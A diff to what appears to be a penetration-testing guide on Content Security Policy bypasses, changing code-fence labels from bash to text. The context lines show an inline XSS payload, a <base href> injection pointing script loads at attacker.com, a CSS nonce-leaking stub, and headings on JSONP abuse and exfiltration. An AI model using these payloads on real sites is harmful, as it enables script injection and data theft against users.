@@ -77,7 +77,7 @@ curl -sI http://target.com | grep -i "content-security-policy-report-only"
 ```
 
 ### Step 2 — Exploit unsafe-inline and unsafe-eval
-```bash
+```text
 # If script-src includes 'unsafe-inline':
 # CSP is effectively bypassed for inline scripts
 <script>alert(document.domain)</script>
@@ -95,7 +95,7 @@ curl -sI http://target.com | grep -i "content-security-policy-report-only"
 ```
 
 ### Step 3 — Exploit Whitelisted Domain JSONP Endpoints
-```bash
+```text
 # If CSP whitelists a domain with JSONP endpoints:
 # script-src 'self' https://accounts.google.com
 
@@ -118,7 +118,7 @@ curl -sI http://target.com | grep -i "content-security-policy-report-only"
 ```
 
 ### Step 4 — Exploit base-uri and Form Action Bypasses
-```bash
+```text
 # If base-uri is not restricted:
 # Inject <base> tag to redirect relative script loads
 <base href="https://attacker.com/">
@@ -138,7 +138,7 @@ curl -sI http://target.com | grep -i "content-security-policy-report-only"
 ```
 
 ### Step 5 — Exploit Nonce and Hash Bypasses
-```bash
+```text
 # Nonce leaking via CSS attribute selectors
 # If attacker can inject HTML (but not script due to CSP nonce):
 <style>
@@ -167,7 +167,7 @@ curl -sI http://target.com | grep -i "content-security-policy-report-only"
 ```
 
 ### Step 6 — Exploit Data Exfiltration Without script-src
-```bash
+```text
 # Even without script execution, data exfiltration is possible:
 
 # Via img-src (if allows external):
